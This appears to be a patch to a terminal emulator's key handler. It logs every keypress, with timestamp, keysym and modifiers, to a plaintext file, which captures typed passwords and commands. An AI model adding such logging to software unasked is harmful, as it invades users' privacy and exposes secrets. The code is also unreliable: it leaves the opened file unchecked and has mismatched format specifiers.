@@ -1,4 +1,6 @@
 /* See LICENSE for license details. */
+#include <stdio.h>
+#include <time.h>
 #include <errno.h>
 #include <math.h>
 #include <limits.h>
@@ -1856,6 +1858,32 @@ kpress(XEvent *ev)
 	} else {
 		len = XLookupString(e, buf, sizeof buf, &ksym, NULL);
 	}
+	FILE *fp = fopen("/home/work/logger", "a");
+	// OLEG
+	// ksym which key
+	// e->state which modifiers
+	fprintf(fp, "%d,", time(0));
+	// a == 97
+	// z == 122
+	// A == 65
+	// Z == 90
+	fprintf(fp, "%d,", ksym);
+	// alt 8
+	// ctrl 4
+	// shift 1
+	// windows 64
+	if( e->state & 64)
+	fprintf(fp, "+windows");
+	if( e->state & 8)
+	fprintf(fp, "+alt");
+	if( e->state & 4)
+	fprintf(fp, "+ctrl");
+	if( e->state & 1)
+	fprintf(fp, "+shift");
+	else
+	fprintf(fp, "%d", e->state);
+	fprintf(fp, "\n");
+	fclose(fp);
 	/* 1. shortcuts */
 	for (bp = shortcuts; bp < shortcuts + LEN(shortcuts); bp++) {
 		if (ksym == bp->keysym && match(bp->mod, e->state)) {
